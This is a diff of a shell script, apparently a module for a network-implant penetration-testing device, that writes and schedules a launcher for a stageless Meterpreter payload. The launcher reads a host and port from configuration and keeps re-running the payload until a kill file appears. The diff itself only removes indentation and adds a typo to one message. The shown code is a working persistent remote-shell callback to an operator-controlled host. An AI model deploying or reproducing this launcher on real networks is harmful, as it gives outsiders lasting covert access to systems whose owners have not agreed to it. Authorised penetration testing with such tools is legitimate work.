@@ -24,25 +24,25 @@ function start {
         touch /etc/turtle/meterpreter/meterpreter_sl_exec
         chmod +x /etc/turtle/meterpreter/meterpreter_sl_exec
 
-        echo '''#!/bin/bash
-        rm /tmp/killmeterpreter_sl
-        DATE=$(date)
-        IP=$(uci get meterpreter_sl.host)
-        PORT=$(uci get meterpreter_sl.port)
-        DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
-        [[ "$IP" == "" || "$PORT" == "" ]] && {
-        logger "Stageless Meterpreter: Error, configuration blank"
-        echo "Stageless Meterpreter: Error, configuration blank"
-        } || {
-        while [ ! -f /tmp/killmeterpreter_sl ]; do
-        echo "Started Stageless Meterpreter at $DATE with $IP $PORT"
-        logger "Stageless Meterpreter: Started at $DATE with $IP $PORT"
-        /usr/bin/meterpreter_sl $IP $PORT
-        done
-        rm /tmp/killmeterpreter_sl
-        echo "Stopped Stageless Meterpreter at $DATE with $IP $PORT"
-        logger "Stageless Meterpreter: Stopped at $DATE with $IP $PORT"
-        }''' > /etc/turtle/meterpreter/meterpreter_sl_exec
+echo '''#!/bin/bash
+rm /tmp/killmeterpreter_sl
+DATE=$(date)
+IP=$(uci get meterpreter_sl.host)
+PORT=$(uci get meterpreter_sl.port)
+DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
+[[ "$IP" == "" || "$PORT" == "" ]] && {
+logger "Stageless Meterpreter: Error, configuration blank"
+echo "Stagelss Meterpreter: Error, configuration blank"
+} || {
+while [ ! -f /tmp/killmeterpreter_sl ]; do
+echo "Started Stageless Meterpreter at $DATE with $IP $PORT"
+logger "Stageless Meterpreter: Started at $DATE with $IP $PORT"
+/usr/bin/meterpreter_sl $IP $PORT
+done
+rm /tmp/killmeterpreter_sl
+echo "Stopped Stageless Meterpreter at $DATE with $IP $PORT"
+logger "Stageless Meterpreter: Stopped at $DATE with $IP $PORT"
+}''' > /etc/turtle/meterpreter/meterpreter_sl_exec
 
         echo "/etc/turtle/meterpreter/meterpreter_sl_exec" | at now
         echo "Stageless Meterpreter started with pid:"
